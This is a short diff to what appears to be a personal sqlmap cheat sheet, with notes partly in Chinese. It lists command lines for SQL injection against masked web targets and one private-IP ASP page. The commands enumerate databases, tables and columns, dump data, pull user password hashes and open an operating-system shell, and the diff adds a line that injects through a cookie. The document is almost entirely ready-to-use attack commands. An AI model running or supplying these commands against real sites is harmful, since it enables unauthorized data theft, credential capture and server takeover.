@@ -16,9 +16,11 @@ sqlmap -u http://****.php?id=1 -D name -tables;
 sqlmap -u http://****.php?id=1 -D name -T name --columns
 sqlmap -u http://****.php?id=1 -D name -T name -C name -dump
 
+sqlmap -u "http://*****.php" --cookie="id=1"  在cookie的地方进行注入
+
 sqlmap -u http：//****.php?id=1 --users
 sqlmap -u http://****.php?id=1 --current-user
 sqlmap -u http://****.php?id=1 --passwords
-sqlmap -u http://****.php?id=1 --
+sqlmap -u http://****.php?id=1 --dbs
 sqlmap -u http://****.php?id=1 --os-shell
 sqlmap.-u http://192.168.87.129/shownews.asp --cookie id=27 --table --level 2
